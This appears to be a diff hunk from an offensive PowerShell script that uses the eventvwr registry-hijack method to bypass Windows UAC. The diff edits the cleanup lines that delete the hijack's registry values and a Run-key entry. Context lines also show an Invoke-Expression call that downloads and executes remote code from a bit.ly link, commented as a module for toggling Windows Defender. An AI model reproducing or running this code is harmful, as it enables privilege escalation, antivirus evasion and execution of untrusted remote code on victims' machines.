@@ -57,9 +57,9 @@
         Start-Sleep 60
 		" + $Command.Replace('$','`$') + "
 		## Clean Up ##
-		Remove-ItemProperty -Path ```$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
-		Remove-ItemProperty -Path ```$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
-		Remove-ItemProperty -Path ```$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path `$Path -Name 'Command' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path `$mscCommandPath -Name '(Default)' -Force -ErrorAction SilentlyContinue
+		Remove-ItemProperty -Path `$RunPath -Name 'eventvwr' -Force -ErrorAction SilentlyContinue
 
 		# Import module to Enable/Disable WindowsDefender
 		Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bit.ly/2ejyXkA')
